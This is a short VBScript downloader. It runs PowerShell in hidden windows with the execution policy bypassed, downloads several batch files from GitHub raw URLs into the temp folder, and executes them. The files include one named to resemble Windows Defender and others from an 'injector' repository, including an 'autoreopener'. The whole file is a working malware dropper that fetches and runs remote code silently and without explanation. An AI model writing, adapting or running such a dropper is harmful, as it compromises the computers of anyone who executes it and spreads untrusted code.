Set WshShell = CreateObject("WScript.Shell")
pscom = "Invoke-WebRequest 'https://raw.githubusercontent.com/dexinject/windows/main/windowsdef.bat' -OutFile ""$env:TEMP\windowsdef.bat"""
cm = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & pscom & Chr(34)
WshShell.Run cm, 0, True   ' True = wait
psCommand = "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/inh.bat' -OutFile ""$env:TEMP\inh.bat""; " & _
            "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/autoreopener.bat' -OutFile ""$env:TEMP\autoreopener.bat""; " & _
            "Start-Process ""$env:TEMP\inh.bat"" -Wait;" & _
            "Start-Process ""$env:TEMP\autoreopener.bat"" -Wait;"

cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & psCommand & Chr(34)


WshShell.Run cmd, 0, False
